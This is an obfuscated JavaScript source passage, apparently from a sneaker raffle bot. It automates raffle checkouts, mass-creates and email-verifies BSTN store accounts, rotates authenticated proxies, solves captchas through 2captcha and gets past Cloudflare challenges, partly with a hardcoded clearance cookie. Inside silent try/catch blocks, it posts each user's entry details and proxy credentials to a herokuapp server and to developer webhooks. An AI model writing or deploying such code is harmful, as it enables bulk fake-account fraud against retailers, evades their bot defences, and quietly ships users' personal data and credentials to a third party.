                        await _0x499c41['type']('#checkout_email', '' + _0x1c473c[_0x142b9b]['Email']), await _0xb9a1a7(0x320), await _0x499c41['type']('#checkout_attributes_instagram', '' + _0x1c473c[_0x142b9b]['Follower']), await _0xb9a1a7(0x320), await _0x499c41['select']('#checkout_shipping_address_country', '' + _0x1c473c[_0x142b9b]['Country']), await _0x499c41['waitForTimeout'](0x258), await _0x499c41['type']('#checkout_shipping_address_first_name', '' + _0x1c473c[_0x142b9b]['FirstName']), await _0x499c41['waitForTimeout'](0x320), await _0x499c41['type']('#checkout_shipping_address_last_name', '' + _0x1c473c[_0x142b9b]['LastName']), await _0x499c41['waitForTimeout'](0x2bc), await _0x499c41['type']('#checkout_shipping_address_address1', _0x1c473c[_0x142b9b]['Address1'] + '\x20' + _0x1c473c[_0x142b9b]['HouseNumber']), await _0x499c41['waitForTimeout'](0x2bc), await _0x499c41['type']('#checkout_shipping_address_address2', '' + _0x1c473c[_0x142b9b]['Address2']), await _0x499c41['waitForTimeout'](0x2bc), await _0x499c41['type']('#checkout_shipping_address_zip', '' + _0x1c473c[_0x142b9b]['Zip']), await _0x499c41['waitForTimeout'](0x2bc), await _0x499c41['type']('#checkout_shipping_address_city', '' + _0x1c473c[_0x142b9b]['City']), await _0x499c41['waitForTimeout'](0x2bc);
                        if (_0x1c473c[_0x142b9b]['State'] != '')
                            try {
                                const _0x183b11 = JSON['parse'](_0xf38118['readFileSync']('States.json', 'utf8'));
                                await _0xb9a1a7(0x1f4);
                                if (_0x1c473c[_0x142b9b]['State']['length'] > 0x2)
                                    for (let _0x384fa4 of _0x183b11) {
                                        if (_0x384fa4['Province'] == _0x1c473c[_0x142b9b]['State']) {
                                            await _0x499c41['select']('#checkout_shipping_address_province', _0x384fa4['Code']);
                                            break;
                                        }
                                    }
                                else
                                    await _0x499c41['select']('#checkout_shipping_address_province', _0x1c473c[_0x142b9b]['State']['toUpperCase']());
                            } catch {
                            }
                        await _0xb9a1a7(0x1f4), console['log'](_0x5b6bc2() + '\x20[' + _0x3b94f9['name'] + ']\x20Task\x20' + (_0x142b9b + 0x1) + '\x20:\x20Getting\x20Shipping'), await _0xb9a1a7(0x190), _0x499c41['evaluate'](() => {
                            const _0x2640f5 = document['querySelector']('#continue_button');
                            for (var _0x1ccdec = 0x0; _0x1ccdec < 0x5; _0x1ccdec++) {
                                if (_0x2640f5) {
                                    _0x2640f5['click'](), _0x2640f5['click']();
                                    break;
                                } else
                                    _0xb9a1a7(0xfa0);
                            }
                        }), await _0x499c41['waitForTimeout'](0x9c4);
                        try {
                            await _0x499c41['waitForSelector']('form[data-shipping-method-form=\x22true\x22]'), await _0x499c41['$eval']('form[data-shipping-method-form=\x22true\x22]', _0x3ebc72 => _0x3ebc72['submit']());
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x499c41['waitForTimeout'](0x7d0), console['log'](_0x5b6bc2() + '\x20[' + _0x3b94f9['name'] + ']\x20Task\x20' + (_0x142b9b + 0x1) + '\x20:\x20Finishing\x20Entry');
                        try {
                            await _0x499c41['waitForSelector']('div[data-payment-subform=\x22required\x22]', { 'timeout': 0x186a0 });
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0xb9a1a7(0x3e8), await _0x499c41['$eval']('body\x20>\x20div.content\x20>\x20div\x20>\x20div\x20>\x20main\x20>\x20div.step\x20>\x20div\x20>\x20form', _0x55ca1e => _0x55ca1e['submit']()), await _0xb9a1a7(0x3e8);
                        try {
                            await _0x499c41['waitForSelector']('div[data-last-step=\x22true\x22]', { 'timeout': 0x186a0 });
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x499c41['$eval']('body\x20>\x20div.content\x20>\x20div\x20>\x20div\x20>\x20main\x20>\x20div.step\x20>\x20form', _0x144346 => _0x144346['submit']());
                        try {
                            await _0x499c41['waitForSelector']('div[data-step=\x22thank_you\x22]'), _0x327bee = 'no', _0x5207fa(_0x1c473c[_0x142b9b], _0x3b94f9), console['log'](_0x5631d3['green'](_0x5b6bc2() + '\x20[' + _0x3b94f9['name'] + ']\x20Task\x20' + (_0x142b9b + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                            if (_0x4a50c2['webhook'] != undefined && _0x4a50c2['webhook'] != '')
                                try {
                                    await _0x313aa7(_0x4a50c2['webhook'], _0x1cd3d1['succesDEVMSG']);
                                } catch {
                                }
                            await _0xb9a1a7(0xc8), await _0x313aa7(_0x495189, _0x1cd3d1['succesDEVMSG']), await _0xb9a1a7(0xc8);
                            try {
                                await _0x313aa7(_0x40302c, _0x1cd3d1['succesPUBMSG']);
                            } catch {
                            }
                            try {
                                prxdata = {
                                    'username': _0x1544fc['replace']('#', ''),
                                    'module': _0x3b94f9['name'],
                                    'entrydata': JSON['stringify'](_0x26e7d5),
                                    'proxy': '' + _0x4c8cb9[_0x142b9b]
                                };
                                var _0x427221 = JSON['stringify'](prxdata);
                                let _0x1ccd08 = { 'headers': { 'content-type': 'application/json' } };
                                await _0x358674['post']('https://jraffles.herokuapp.com/success', _0x427221, _0x1ccd08);
                            } catch (_0x545f0c) {
                            }
                        } catch (_0x44ba97) {
                            throw new Error('Connection\x20Error\x20Fetching\x20Response');
                        }
                    } catch (_0xdb945f) {
                        _0xdb945f['message']['includes']('selector') && (_0xdb945f = 'Connection\x20Error');
                        console['log'](_0x5631d3['red'](_0x5b6bc2() + '\x20[' + _0x3b94f9['name'] + ']\x20Task\x20' + (_0x142b9b + 0x1) + '\x20:\x20' + _0xdb945f)), _0x3b13b6 = '' + _0xdb945f;
                        var _0x45cc5f = await _0x530ba6(_0x1c473c[_0x142b9b], _0x3b94f9, 'dev', !![], _0x3b13b6);
                        _0x1cd3d1['errorDEV'] = { 'embeds': [_0x45cc5f] }, _0x4a50c2['webhook'] != undefined && _0x4a50c2['webhook'] != '' && await _0x313aa7(_0x4a50c2['webhook'], _0x1cd3d1['errorDEV']), await _0x313aa7(_0x4190b7, _0x1cd3d1['errorDEV']), _0x327bee = 'yes';
                    } finally {
                        _0x2696c7 && _0x2696c7['close']();
                        if (_0x327bee == 'yes' && _0x55fea0 != 0x5 && _0x3b13b6 != 'Size\x20Not\x20Found') {
                            console['log'](_0x5631d3['red'](_0x5b6bc2() + '\x20[' + _0x3b94f9['name'] + ']\x20Task\x20' + (_0x142b9b + 0x1) + '\x20:\x20Retrying\x20(' + _0x55fea0 + '\x20/\x205)')), _0x142b9b = _0x142b9b - 0x1, _0x55fea0 = _0x55fea0 + 0x1;
                            continue;
                        }
                        _0x327bee == 'yes' && _0x55fea0 >= 0x5 && (_0x100e1d(_0x1c473c[_0x142b9b], _0x3b94f9), _0x327bee = 'no', _0x55fea0 = 0x0);
                        if (_0x142b9b + 0x1 == _0x1c473c['length']) {
                            await _0xb9a1a7(0x7d0);
                            break;
                        }
                        console['log']('Waiting\x20for\x20' + _0x4a50c2['AfewDelay'] + '\x20ms'), await _0xb9a1a7(_0x4a50c2['AfewDelay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'BSTN',
        'modules': [
            {
                'name': 'BSTN\x20Account\x20Generator',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x7e3f93, _0xf818e6, _0x3ec367) {
                    var _0x314aeb = _0xf818e6, _0x242cfc = 0x0;
                    for (var _0x4d68dd = 0x0; _0x4d68dd < _0xf818e6['length']; _0x4d68dd++) {
                        maxTasks = Number(_0x4a50c2['threads']);
                        while (_0x242cfc >= maxTasks) {
                            await _0xb9a1a7(_0x4a50c2['delay']);
                        }
                        async function _0x35c091(_0x1edf91, _0x3082f0, _0x4012e4, _0x1be1e8, _0x485261) {
                            _0x242cfc++, _0x14f2e1['use'](_0x3313a5()), _0x14f2e1['use'](_0x2255ea({
                                'provider': {
                                    'id': '2captcha',
                                    'token': '' + _0x4a50c2['captchaKey']
                                },
                                'visualFeedback': !![]
                            }));
                            var _0x9b62a5;
                            try {
                                await _0x2dc03a(_0x3082f0, _0x1be1e8);
                            } catch {
                                retry = 'no';
                                throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                            }
                            _0x5bbc27(_0x1edf91['name'] + '\x20Task\x20' + (_0x1be1e8 + 0x1) + '\x20/\x20' + _0x3082f0['length'] + '\x20||\x20File:\x20' + _0x3d6b41 + '\x20Proxies:\x20' + _0x4629ee);
                            var _0x36ac34 = await _0x530ba6(_0x3082f0[_0x1be1e8], _0x1edf91, 'acc', ![]);
                            const _0x580411 = { 'succesDEVMSG': { 'embeds': [_0x36ac34] } }, _0x1f6fc7 = 'https://www.bstn.com/eu_en/customer/account/create/';
                            var _0x303973 = Math['round'](Math['random']() * (_0x4012e4['length'] - 0x1)), _0x42c283 = _0x4012e4[_0x303973]['split'](':'), _0x483f03;
                            try {
                                _0x483f03 = await _0x14f2e1['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0x42c283[0x0] + ':' + _0x42c283[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            } catch {
                                _0x483f03 = await _0x14f2e1['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0x42c283[0x0] + ':' + _0x42c283[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            }
                            try {
                                const _0x534c50 = await _0x483f03['newPage']();
                                await _0x534c50['authenticate']({
                                    'username': '' + _0x42c283[0x2],
                                    'password': '' + _0x42c283[0x3]
                                }), console['log'](_0x5b6bc2() + '\x20[' + _0x1edf91['name'] + ']\x20Task\x20' + (_0x1be1e8 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x534c50['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x534c50['setRequestInterception'](!![]), _0x534c50['on']('request', _0x35e41f => {
                                    _0x35e41f['resourceType']() === 'image' ? _0x35e41f['abort']() : _0x35e41f['continue']();
                                });
                                try {
                                    await _0x534c50['goto']('' + _0x1f6fc7), await _0x534c50['waitForSelector']('button[class=\x22cf2Lf6\x22]');
                                } catch {
                                    throw new Error('Proxy\x20Error');
                                }
                                await _0x534c50['click']('button[class=\x22cf2Lf6\x22]'), console['log'](_0x5b6bc2() + '\x20[' + _0x1edf91['name'] + ']\x20Task\x20' + (_0x1be1e8 + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0xb9a1a7(0x7d0), console['log'](_0x5b6bc2() + '\x20[' + _0x1edf91['name'] + ']\x20Task\x20' + (_0x1be1e8 + 0x1) + '\x20:\x20Checking\x20Credentials'), await _0xb9a1a7(0x190), await _0x534c50['waitForSelector']('#firstname'), await _0x534c50['focus']('#firstname'), await _0x534c50['keyboard']['down']('Control'), await _0x534c50['keyboard']['press']('A'), await _0xb9a1a7(0xc8), await _0x534c50['keyboard']['up']('Control'), await _0x534c50['keyboard']['press']('Backspace'), await _0x534c50['type']('#firstname', _0x3082f0[_0x1be1e8]['FirstName'], { 'delay': 0xf0 }), await _0xb9a1a7(0x190), await _0x534c50['focus']('#lastname'), await _0x534c50['keyboard']['down']('Control'), await _0x534c50['keyboard']['press']('A'), await _0xb9a1a7(0xc8), await _0x534c50['keyboard']['up']('Control'), await _0x534c50['keyboard']['press']('Backspace'), await _0x534c50['type']('#lastname', _0x3082f0[_0x1be1e8]['LastName'], { 'delay': 0xe6 }), await _0xb9a1a7(0x190), await _0x534c50['focus']('#email_address'), await _0x534c50['keyboard']['down']('Control'), await _0x534c50['keyboard']['press']('A'), await _0xb9a1a7(0xc8), await _0x534c50['keyboard']['up']('Control'), await _0x534c50['keyboard']['press']('Backspace'), await _0x534c50['type']('#email_address', _0x3082f0[_0x1be1e8]['Email'], { 'delay': 0x122 }), await _0xb9a1a7(0x190), await _0x534c50['type']('#password', _0x3082f0[_0x1be1e8]['Password'], { 'delay': 0x82 }), await _0xb9a1a7(0x1f4), await _0x534c50['type']('#password-confirmation', _0x3082f0[_0x1be1e8]['Password'], { 'delay': 0x7c }), console['log'](_0x5b6bc2() + '\x20[' + _0x1edf91['name'] + ']\x20Task\x20' + (_0x1be1e8 + 0x1) + '\x20:\x20Sending\x20Request'), await _0xb9a1a7(0x2bc), await _0x534c50['$eval']('#form-validate', _0x330c52 => _0x330c52['submit']()), await _0xb9a1a7(0x1388);
                                const _0x35cc58 = await _0x534c50['$']('#email_address-error');
                                if (_0x35cc58)
                                    throw new Error('Invalid\x20Email');
                                const _0x221c3f = await _0x534c50['$']('#password-error');
                                if (_0x221c3f)
                                    throw new Error('Invalid\x20Password');
                                await _0x534c50['waitForSelector']('div.mesg-success'), retry = 'no', console['log'](_0x5631d3['green'](_0x5b6bc2() + '\x20[' + _0x1edf91['name'] + ']\x20Task\x20' + (_0x1be1e8 + 0x1) + '\x20:\x20Account\x20' + _0x3082f0[_0x1be1e8]['Email'] + '\x20Generated')), _0xf38118['appendFileSync']('../accounts/bstn.csv', '\x0a' + _0x3082f0[_0x1be1e8]['Email'] + ',' + _0x3082f0[_0x1be1e8]['Password']);
                                try {
                                    _0x4a50c2['webhook'] != undefined && _0x4a50c2['webhook'] != '' && await _0x313aa7(_0x4a50c2['webhook'], _0x580411['succesDEVMSG']);
                                } catch {
                                }
                                await _0x313aa7(_0x54bd15, _0x580411['succesDEVMSG']);
                                let _0x5d0911 = _0x3082f0[_0x1be1e8];
                                try {
                                    prxdata = {
                                        'username': _0x1544fc['replace']('#', ''),
                                        'module': _0x1edf91['name'],
                                        'entrydata': JSON['stringify'](_0x5d0911),
                                        'proxy': '' + _0x4012e4[_0x1be1e8]
                                    };
                                    var _0x575cca = JSON['stringify'](prxdata);
                                    let _0x31b72d = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x358674['post']('https://jraffles.herokuapp.com/success', _0x575cca, _0x31b72d);
                                } catch (_0x1d2fd8) {
                                }
                                console['log'](_0x5631d3['yellow'](_0x5b6bc2() + '\x20[' + _0x1edf91['name'] + ']\x20Task\x20' + (_0x1be1e8 + 0x1) + '\x20:\x20After\x20your\x20all\x20tasks\x20are\x20finished,\x20run\x20\x27BSTN\x20Account\x20Verifier\x27'));
                            } catch (_0x3069b9) {
                                console['log'](_0x5631d3['red'](_0x5b6bc2() + '\x20[' + _0x1edf91['name'] + ']\x20Task\x20' + (_0x1be1e8 + 0x1) + '\x20:\x20' + _0x3069b9)), _0x9b62a5 = '' + _0x3069b9;
                                var _0xb72ecc = await _0x530ba6(_0x3082f0[_0x1be1e8], _0x1edf91, 'acc', !![], _0x9b62a5);
                                _0x580411['errorDEV'] = { 'embeds': [_0xb72ecc] }, _0x4a50c2['webhook'] != undefined && _0x4a50c2['webhook'] != '' && await _0x313aa7(_0x4a50c2['webhook'], _0x580411['errorDEV']), await _0x313aa7(_0x4190b7, _0x580411['errorDEV']), retry = 'yes';
                            } finally {
                                if (_0x483f03)
                                    _0x483f03['close']();
                                if (retry == 'yes' && _0x485261 < 0x5)
                                    return console['log'](_0x5631d3['red'](_0x5b6bc2() + '\x20[' + _0x1edf91['name'] + ']\x20Task\x20' + (_0x1be1e8 + 0x1) + '\x20:\x20Retrying\x20(' + (_0x485261 + 0x1) + '\x20/\x205)')), _0x242cfc--, _0x485261 = _0x485261 + 0x1, _0x35c091(_0x1edf91, _0x3082f0, _0x4012e4, _0x1be1e8, _0x485261);
                                retry == 'yes' && _0x485261 >= 0x5 && (_0x100e1d(_0x3082f0[_0x1be1e8], _0x1edf91), retry = 'no', _0x485261 = 0x0), _0x242cfc--, console['log'](_0x5b6bc2() + '\x20[' + _0x1edf91['name'] + ']\x20Waiting\x20for\x20' + _0x4a50c2['delay'] + '\x20ms'), await _0xb9a1a7(_0x4a50c2['delay']);
                            }
                        }
                        _0x35c091(_0x7e3f93, _0x314aeb, _0x3ec367, _0x4d68dd, 0x0), await _0xb9a1a7(0x190);
                    }
                }
            },
            {
                'name': 'BSTN\x20Account\x20Verifier',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x206edd, _0x2b2b52) {
                    var _0x53201d = ![], _0x34b261 = [], _0xc831 = 0x0;
                    async function _0x314bc6() {
                        var _0x5898c1 = new _0x373ca3({
                            'user': _0x4a50c2['masterMail'],
                            'password': _0x4a50c2['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x3c9c67(_0x143d52) {
                            _0x5898c1['openBox']('INBOX', ![], _0x143d52);
                        }
                        _0x5898c1['once']('ready', function () {
                            _0x3c9c67(function (_0x33a6f3, _0x2174ad) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x33a6f3)
                                    throw _0x33a6f3;
                                _0x5898c1['seq']['search']([
                                    'UNSEEN',
                                    [
                                        'SUBJECT',
                                        'Please\x20confirm\x20your\x20BSTN\x20Store\x20account'
                                    ]
                                ], function (_0x1687bb, _0x11a805) {
                                    if (!_0x11a805 || !_0x11a805['length'])
                                        console['log'](_0x5b6bc2() + '\x20[' + _0x206edd['name'] + ']\x20No\x20mails\x20found'), _0x5898c1['end']();
                                    else {
                                        var _0x5c46b8 = _0x5898c1['seq']['fetch'](_0x11a805, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x5c46b8['on']('message', function (_0x211662, _0x475e86) {
                                            var _0x3139e2 = '(#' + _0x475e86 + ')\x20';
                                            _0x211662['on']('body', function (_0xa1b1d0, _0x40975b) {
                                                _0x489d8f(_0xa1b1d0, (_0x2e90e0, _0x203e7f) => {
                                                    var _0x1f4f0e = _0x203e7f['text']['split']('customer/account/confirm/')[0x1], _0x3dafb1 = _0x1f4f0e['split'](']')[0x0];
                                                    _0x34b261['push']('https://www.bstn.com/eu_en/customer/account/confirm/' + _0x3dafb1);
                                                });
                                            }), _0x211662['once']('end', function () {
                                            });
                                        }), _0x5c46b8['once']('error', function (_0x542e20) {
                                            console['log']('Fetch\x20error:\x20' + _0x542e20), _0x53201d = !![];
                                        }), _0x5c46b8['once']('end', function () {
                                            _0x5898c1['end'](), _0x53201d = !![];
                                        });
                                    }
                                });
                            });
                        }), _0x5898c1['once']('error', function (_0x3677c9) {
                            console['log'](_0x5631d3['red'](_0x3677c9['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x53201d = !![];
                        }), _0x5898c1['once']('end', async function () {
                            _0x53201d = !![];
                        }), _0x5898c1['connect']();
                    }
                    try {
                        _0x314bc6();
                        while (!_0x53201d) {
                            await _0xb9a1a7(0xfa0);
                        }
                        console['log']('Found\x20' + _0x34b261['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..'), await _0xb9a1a7(0x7d0);
                    }
                    for (var _0x1dc061 = 0x0; _0x1dc061 < _0x34b261['length']; _0x1dc061++) {
                        maxTasks = Number(_0x4a50c2['threads']);
                        while (_0xc831 >= maxTasks) {
                            await _0xb9a1a7(_0x4a50c2['delay']);
                        }
                        async function _0x936a6(_0x2237bb, _0x4da904, _0x2610cb, _0x2b3820, _0x290d4d) {
                            _0xc831++, _0x14f2e1['use'](_0x3313a5());
                            if (_0x2718ee != 'yes')
                                var _0x2718ee = '', _0x290d4d = 0x0;
                            var _0x380be2 = Math['round'](Math['random']() * (_0x2610cb['length'] - 0x1)), _0x21f9ca = _0x2610cb[_0x380be2]['split'](':'), _0x2103fc;
                            try {
                                _0x2103fc = await _0x14f2e1['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0x21f9ca[0x0] + ':' + _0x21f9ca[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            } catch {
                                _0x2103fc = await _0x14f2e1['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0x21f9ca[0x0] + ':' + _0x21f9ca[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            }
                            try {
                                const _0x2e849b = await _0x2103fc['newPage']();
                                await _0x2e849b['authenticate']({
                                    'username': '' + _0x21f9ca[0x2],
                                    'password': '' + _0x21f9ca[0x3]
                                }), console['log'](_0x5b6bc2() + '\x20[' + _0x2237bb['name'] + ']\x20Task\x20' + (_0x2b3820 + 0x1) + '\x20:\x20Starting\x20Verification'), await _0x2e849b['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x2e849b['setRequestInterception'](!![]), _0x2e849b['on']('request', _0x1ea0d3 => {
                                    _0x1ea0d3['resourceType']() === 'image' || _0x1ea0d3['resourceType']() === 'font' || _0x1ea0d3['resourceType']() === 'media' ? _0x1ea0d3['abort']() : _0x1ea0d3['continue']();
                                }), console['log'](_0x5b6bc2() + '\x20[' + _0x2237bb['name'] + ']\x20Task\x20' + (_0x2b3820 + 0x1) + '\x20:\x20Getting\x20Session');
                                try {
                                    await _0x2e849b['goto'](_0x4da904[_0x2b3820]);
                                } catch (_0x29e045) {
                                    _0x2718ee = 'yes';
                                    throw new Error('\x27Connection\x20Error\x27\x20' + _0x29e045);
                                }
                                console['log'](_0x5b6bc2() + '\x20[' + _0x2237bb['name'] + ']\x20Task\x20' + (_0x2b3820 + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0x2e849b['waitForTimeout'](0xbb8);
                                try {
                                    await _0x2e849b['waitForSelector']('.account-nav'), _0x2718ee = 'no', console['log'](_0x5631d3['green'](_0x5b6bc2() + '\x20[' + _0x2237bb['name'] + ']\x20Task\x20' + (_0x2b3820 + 0x1) + '\x20:\x20Verification\x20Successful'));
                                    var _0x450a1e = await _0x530ba6(null, _0x2237bb, 'ver', ![]);
                                    const _0x39e0b5 = { 'succesDEVMSG': { 'embeds': [_0x450a1e] } };
                                    await _0x313aa7(_0x41e473, _0x39e0b5['succesDEVMSG']);
                                } catch {
                                    _0x2718ee = 'no';
                                    throw new Error('Link\x20Already\x20Verified,\x20skipping..');
                                }
                            } catch (_0x1ac7d8) {
                                console['log'](_0x5631d3['red'](_0x5b6bc2() + '\x20[' + _0x2237bb['name'] + ']\x20Task\x20' + (_0x2b3820 + 0x1) + '\x20:\x20' + _0x1ac7d8));
                                var _0xf2bd8a = _0x1ac7d8, _0x8e4e9f = await _0x530ba6(null, _0x2237bb, 'ver', !![], _0xf2bd8a);
                                const _0x1e103a = { 'errorDEVMSG': { 'embeds': [_0x8e4e9f] } };
                                _0x4a50c2['webhook'] != undefined && _0x4a50c2['webhook'] != '' && await _0x313aa7(_0x4a50c2['webhook'], _0x1e103a['errorDEVMSG']), await _0x313aa7(_0x4190b7, _0x1e103a['errorDEVMSG']);
                            } finally {
                                if (_0x2103fc)
                                    _0x2103fc['close']();
                                if (_0x2718ee == 'yes' && _0x290d4d != 0x5)
                                    return console['log'](_0x5631d3['red'](_0x5b6bc2() + '\x20[' + _0x2237bb['name'] + ']\x20Task\x20' + (_0x2b3820 + 0x1) + '\x20:\x20Retrying\x20(' + _0x290d4d + '\x20/\x205)')), _0xc831--, _0x290d4d = _0x290d4d + 0x1, _0x936a6(_0x2237bb, _0x4da904, _0x2610cb, _0x2b3820, _0x290d4d);
                                _0x2718ee == 'yes' && _0x290d4d >= 0x5 && (_0x2718ee = 'no', _0x290d4d = 0x0), _0xc831--, console['log'](_0x5b6bc2() + '\x20[' + _0x2237bb['name'] + ']\x20Waiting\x20for\x20' + _0x4a50c2['delay'] + '\x20ms'), await _0xb9a1a7(_0x4a50c2['delay']);
                            }
                        }
                        if (_0x1dc061 == _0x34b261['length'] - 0x1) {
                            await _0x936a6(_0x206edd, _0x34b261, _0x2b2b52, _0x1dc061, 0x0);
                            return;
                        }
                        _0x936a6(_0x206edd, _0x34b261, _0x2b2b52, _0x1dc061, 0x0), await _0xb9a1a7(0x12c);
                    }
                }
            },
            {
                'name': 'BSTN\x20Raffle\x20Entries',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x2bf541, _0x2744fc, _0x678590) {
                    var _0x1fcb90 = 0x0, _0x4cabdf = _0x2744fc;
                    for (var _0x528038 = 0x0; _0x528038 < _0x2744fc['length']; _0x528038++) {
                        maxTasks = Number(_0x4a50c2['threads']);
                        while (_0x1fcb90 >= maxTasks) {
                            await _0xb9a1a7(_0x4a50c2['delay']);
                        }
                        let _0x5cc6cc = ![];
                        async function _0x31db1b(_0x5e228c, _0x16b09c, _0x3b8170, _0x15e8c7, _0x501b6a) {
                            _0x1fcb90++, _0x14f2e1['use'](_0x3313a5()), _0x14f2e1['use'](_0x2255ea({
                                'provider': {
                                    'id': '2captcha',
                                    'token': '' + _0x4a50c2['captchaKey']
                                },
                                'visualFeedback': !![]
                            }));
                            var _0x14579f, _0x11aedb = _0x16b09c[_0x15e8c7];
                            try {
                                await _0x2dc03a(_0x16b09c, _0x15e8c7);
                            } catch {
                                _0x2c1d08 = 'no';
                                throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                            }
                            async function _0x185b4f(_0x47665b) {
                                const _0x4b3288 = _0xf38118['readFileSync']('../successful-tasks.csv', 'utf8'), _0x45bb06 = _0x2587e1['parse'](_0x4b3288, { 'header': !![] })['data'];
                                let _0x595d53 = ![];
                                for (var _0x14410b of _0x45bb06) {
                                    if (_0x14410b['Url'] == _0x47665b['Url'] && _0x14410b['Email'] == _0x47665b['Email']) {
                                        _0x595d53 = !![];
                                        break;
                                    }
                                }
                                return _0x595d53;
                            }
                            _0x5bbc27(_0x5e228c['name'] + '\x20Task\x20' + (_0x15e8c7 + 0x1) + '\x20/\x20' + _0x16b09c['length'] + '\x20||\x20File:\x20' + _0x3d6b41 + '\x20Proxies:\x20' + _0x4629ee);
                            var _0x50de17 = Math['round'](Math['random']() * (_0x3b8170['length'] - 0x1)), _0x7fb7c9 = _0x3b8170[_0x50de17]['split'](':'), _0x3daaf0;
                            let _0x24598f = ![], _0x2c1d08 = 'no';
                            try {
                                if (await _0x185b4f(_0x16b09c[_0x15e8c7]) == !![]) {
                                    console['log'](_0x5b6bc2() + '\x20[' + _0x5e228c['name'] + ']\x20Task\x20' + (_0x15e8c7 + 0x1) + '\x20:\x20Task\x20Already\x20Entered,\x20Going\x20to\x20Next\x20Task'), _0x24598f = !![], _0x5cc6cc = !![];
                                    return;
                                }
                                try {
                                    _0x3daaf0 = await _0x14f2e1['launch']({
                                        'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                        'headless': ![],
                                        'args': [
                                            '--proxy-server=' + _0x7fb7c9[0x0] + ':' + _0x7fb7c9[0x1],
                                            '--no-sandbox',
                                            '--disable-setuid-sandbox'
                                        ]
                                    });
                                } catch {
                                    _0x3daaf0 = await _0x14f2e1['launch']({
                                        'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                        'headless': ![],
                                        'args': [
                                            '--proxy-server=' + _0x7fb7c9[0x0] + ':' + _0x7fb7c9[0x1],
                                            '--no-sandbox',
                                            '--disable-setuid-sandbox'
                                        ]
                                    });
                                }
                                const _0x259154 = await _0x3daaf0['newPage'](), _0x209448 = await _0x259154['target']()['createCDPSession'](), { windowId: _0x3ef71b } = await _0x209448['send']('Browser.getWindowForTarget');
                                await _0x259154['setViewport']({
                                    'width': 0x501,
                                    'height': 0x2d0
                                });
                                var _0x2ab204 = [{
                                    'name': 'cf_clearance',
                                    'value': 'uyuh7Wo9shR3zcpWvbWJ04mG0iNC2N25mhp1FNAbHYY-1676282182-0-1-9764d0ee.e7bea100.c0658f0e-160',
                                    'domain': '.bstn.com',
                                    'path': '/',
                                    'expires': 1707818183.331533,
                                    'httpOnly': !![],
                                    'secure': !![]
                                }];
                                await _0x259154['authenticate']({
                                    'username': '' + _0x7fb7c9[0x2],
                                    'password': '' + _0x7fb7c9[0x3]
                                }), console['log'](_0x5b6bc2() + '\x20[' + _0x5e228c['name'] + ']\x20Task\x20' + (_0x15e8c7 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x259154['goto']('' + _0x16b09c[_0x15e8c7]['Url'], { 'waitUntil': 'networkidle2' }), console['log'](_0x5b6bc2() + '\x20[' + _0x5e228c['name'] + ']\x20Task\x20' + (_0x15e8c7 + 0x1) + '\x20:\x20Solving\x20Cloudflare'), await _0xb9a1a7(0x1388);
                                var _0x257271 = await _0x259154['$']('#turnstile-wrapper');
                                if (_0x257271) {
                                    console['log'](_0x5b6bc2() + '\x20[' + _0x5e228c['name'] + ']\x20Task\x20' + (_0x15e8c7 + 0x1) + '\x20:\x20Handling\x20Challenge'), await _0xb9a1a7(0x2710);
